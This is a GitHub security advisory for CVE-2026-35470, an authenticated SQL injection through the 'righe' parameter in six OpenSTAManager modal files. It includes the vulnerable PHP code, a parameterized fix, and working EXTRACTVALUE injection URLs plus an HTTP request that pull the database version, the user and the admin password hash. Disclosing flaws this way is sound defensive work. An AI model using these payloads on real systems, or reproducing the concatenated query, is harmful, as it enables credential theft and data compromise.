# [H] OpenSTAManager has a SQL Injection via righe Parameter in confronta_righe Modals

## Summary
Severity: High
Advisory: GHSA-mmm5-3g4x-qw39
CVE: CVE-2026-35470
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-mmm5-3g4x-qw39
Type: github-advisory

## Affected
- Packagist: `devcode-it/openstamanager` — affected >=0 <2.10.2

## Details
## Description

Six `confronta_righe.php` files across different modules in OpenSTAManager <= 2.10.1 contain an SQL Injection vulnerability. The `righe` parameter received via `$_GET['righe']` is directly concatenated into an SQL query without any sanitization, parameterization or validation.

An authenticated attacker can inject arbitrary SQL statements to extract sensitive data from the database, including user credentials, customer information, invoice data and any other stored data.

## Affected Files

All 6 vulnerable files share the same code pattern:

| # | File | Line | Affected Table |
|---|------|------|----------------|
| 1 | `modules/fatture/modals/confronta_righe.php` | 29 | `co_righe_documenti` |
| 2 | `modules/interventi/modals/confronta_righe.php` | 29 | `in_righe_interventi` |
| 3 | `modules/preventivi/modals/confronta_righe.php` | 28 | `co_righe_preventivi` |
| 4 | `modules/ordini/modals/confronta_righe.php` | 29 | `or_righe_ordini` |
| 5 | `modules/ddt/modals/confronta_righe.php` | 29 | `dt_righe_ddt` |
| 6 | `modules/contratti/modals/confronta_righe.php` | 28 | `co_righe_contratti` |

## Vulnerable Code

All files follow the same pattern. Example from `modules/interventi/modals/confronta_righe.php`:

```php
$righe = $_GET['righe'];  // Line 29 — No sanitization

$righe = $dbo->fetchArray(
    'SELECT
        `mg_articoli_lang`.`title`,
        `mg_articoli`.`codice`,
        `in_righe_interventi`.*
    FROM
        `in_righe_interventi`
        INNER JOIN `mg_articoli` ON `mg_articoli`.`id` = `in_righe_interventi`.`idarticolo`
        LEFT JOIN `mg_articoli_lang` ON (...)
    WHERE
        `in_righe_interventi`.`id` IN ('.$righe.')'  // Line 41 — Direct concatenation
);
```

The value of `$_GET['righe']` is inserted directly into the SQL `IN()` clause without using `prepare()`, parameterized statements or any sanitization function.

## Reproduction

### Prerequisites

- Authenticated session (any user with module access)
- At least one existing record in the target module (e.g. an intervention with id=1)

### Step 1: Extract MySQL version

```
GET /modules/interventi/modals/confronta_righe.php?id_module=3&id_record=1&righe=1) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))%23
```

**Result:** `XPATH syntax error: '~8.3.0'`

### Step 2: Extract database user

```
GET /modules/interventi/modals/confronta_righe.php?id_module=3&id_record=1&righe=1) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER())))%23
```

**Result:** `XPATH syntax error: '~root@172.19.0.3'`

### Step 3: Extract admin credentials

```
GET /modules/interventi/modals/confronta_righe.php?id_module=3&id_record=1&righe=1) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM zz_users LIMIT 1)))%23
```

**Result:** `XPATH syntax error: '~admin:$2y$10$qAo04wNbhR9cpxjHzr'`

### Evidence

<img width="1254" height="395" alt="image" src="https://github.com/user-attachments/assets/a2367ed6-fa03-4668-9d74-4298cac5e429" />


### HTTP Request

```http
GET /modules/interventi/modals/confronta_righe.php?id_module=3&id_record=1&righe=1)%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20CONCAT(username,0x3a,password)%20FROM%20zz_users%20LIMIT%201)))%23 HTTP/1.1
Host: <TARGET>
Cookie: PHPSESSID=<SESSION_ID>
```

### Response (excerpt)

```
SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~admin:$2y$10$qAo04wNbhR9cpxjHzr'
```

## Impact

- **Confidentiality (High):** Full database data extraction including user credentials (bcrypt hashes), customer data, invoices, contracts and any stored information
- **Integrity (High):** Data modification via injected INSERT/UPDATE/DELETE statements through stacked queries or subqueries
- **Availability (High):** Deletion of tables or critical data, database corruption

## Remediation

### Recommended Fix

Use parameterized statements with `prepare()` for the `righe` parameter:

```php
// BEFORE (vulnerable):
$righe = $_GET['righe'];
$righe = $dbo->fetchArray(
    '... WHERE `in_righe_interventi`.`id` IN ('.$righe.')'
);

// AFTER (secure):
$righe_ids = array_map('intval', explode(',', $_GET['righe'] ?? ''));
$placeholders = implode(',', array_fill(0, count($righe_ids), '?'));
$righe = $dbo->fetchArray(
    '... WHERE `in_righe_interventi`.`id` IN ('.$placeholders.')',
    $righe_ids
);
```

This fix must be applied to all **6 files** listed in the "Affected Files" section.

## Credits
Omar Ramirez

## References
- https://github.com/devcode-it/openstamanager/security/advisories/GHSA-mmm5-3g4x-qw39
- https://github.com/devcode-it/openstamanager
- https://github.com/devcode-it/openstamanager/releases/tag/v2.10.2
